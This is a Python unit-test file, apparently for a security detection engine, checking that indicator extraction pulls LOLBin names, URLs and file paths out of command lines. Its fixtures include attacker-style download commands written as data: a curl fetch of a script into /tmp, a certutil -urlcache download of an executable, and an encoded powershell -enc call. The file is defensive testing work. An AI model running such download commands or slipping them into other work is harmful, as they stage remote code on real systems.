"""Indicator extraction must not depend on a behavior model or its routing."""
from pathlib import Path
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from engine import GenosEngine


class IndicatorEvidenceTests(unittest.TestCase):
    def setUp(self):
        self.engine = GenosEngine.__new__(GenosEngine)

    def test_plain_command_extracts_binary_and_artifacts_without_models(self):
        command = 'curl https://example.org/a.sh -o /tmp/a.sh'
        evidence = self.engine._collect_indicator_evidence(command, command, False)
        self.assertIn('curl', evidence['lolbin_matches'])
        self.assertIn('https://example.org/a.sh', evidence['urls'])
        self.assertIn('/tmp/a.sh', evidence['file_paths'])

    def test_decoded_payload_preserves_both_binary_matches(self):
        payload = r'certutil -urlcache -split -f https://example.org/a.exe C:\Temp\a.exe'
        evidence = self.engine._collect_indicator_evidence('powershell -enc AAAA', payload, True)
        self.assertIn('powershell', evidence['lolbin_matches'])
        self.assertIn('certutil', evidence['lolbin_matches'])
        self.assertIn('https://example.org/a.exe', evidence['urls'])
        self.assertIn(r'C:\Temp\a.exe', evidence['file_paths'])
        self.assertEqual(evidence['deobfuscated_command'], payload)

    def test_no_artifacts_does_not_invent_indicators(self):
        evidence = self.engine._collect_indicator_evidence('pwd', 'pwd', False)
        for key in ('lolbin_matches', 'urls', 'domains', 'ips', 'file_paths', 'registry_paths'):
            self.assertEqual(evidence[key], [], key)


if __name__ == '__main__':
    unittest.main()
